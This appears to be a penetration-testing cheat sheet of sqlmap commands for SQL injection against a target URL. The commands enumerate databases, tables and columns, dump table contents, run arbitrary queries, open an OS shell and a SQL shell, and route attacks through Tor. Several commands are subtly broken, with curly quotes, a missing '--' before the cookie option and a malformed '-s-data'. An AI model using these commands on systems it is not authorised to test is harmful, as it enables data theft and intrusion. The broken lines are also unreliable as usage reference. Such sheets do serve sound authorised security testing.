```bash

# Enumerate current database in use
sqlmap -u "$URL" --current-db

# Enumerate databases
sqlmap --dbms=mysql -u "$URL" --dbs

# Enumerate tables
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables

# Dump table data
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump

# List columns of table target_Table of database target_DB
sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns

# Specify target DBMS to MySQL
sqlmap -u "$URL" --dbms=mysql

# Specify parameter to exploit
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2

# Specify parameter to exploit in 'nice' URIs
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1

# Get OS shell
sqlmap --dbms=mysql -u "$URL" --os-shell

# Get SQL shell
sqlmap --dbms=mysql -u "$URL" --sql-shell

# SQL query
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"

# Use Tor Socks5 proxy
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs

# Using a proxy
sqlmap -u “http://target_server/” --proxy=http://proxy_address:port

# Use POST requests
sqlmap -u “http://target_server” --data=param1=value1&param2=value2

# Access with authenticated session
sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’

# Basic authentication
sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

# Evaluating response strings
sqlmap -u “http://target_server/” --string=”This string if query is TRUE”

sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”




```
